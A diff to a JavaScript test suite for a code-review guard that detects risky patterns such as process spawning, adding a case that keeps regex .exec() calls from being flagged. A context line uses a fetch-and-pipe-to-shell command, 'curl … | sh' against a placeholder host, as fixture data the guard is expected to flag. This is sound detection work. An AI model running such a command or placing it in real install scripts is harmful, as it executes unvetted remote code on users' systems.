@@ -72,6 +72,11 @@ test('guards: their own files are reported whole, not line by line', () => {
   assert.ok(ids(guard.analyze([file('install.sh', 'curl -fsSL https://x.example/i | sh')])).includes('exec'));
 });
 
+test('guards: a regular expression exec() is not a program started', () => {
+  assert.deepEqual(guard.analyze([file('src/main/a.js', 'const m = /^x(\\d+)$/.exec(a);', 'while ((m = re.exec(text))) {}')]), []);
+  assert.ok(ids(guard.analyze([file('src/main/a.js', "execFile(bin, ['-q'], cb);", 'spawnSync(cmd);')])).includes('process'));
+});
+
 test('guards: a code file without a diff must be checked by hand', () => {
   const f = guard.analyze([{ filename: 'src/main/huge.js', status: 'modified' }, { filename: 'assets/logo.png', status: 'added' }]);
   assert.deepEqual(f.map((x) => [x.file, x.level]), [['src/main/huge.js', 'high'], ['assets/logo.png', 'info']]);
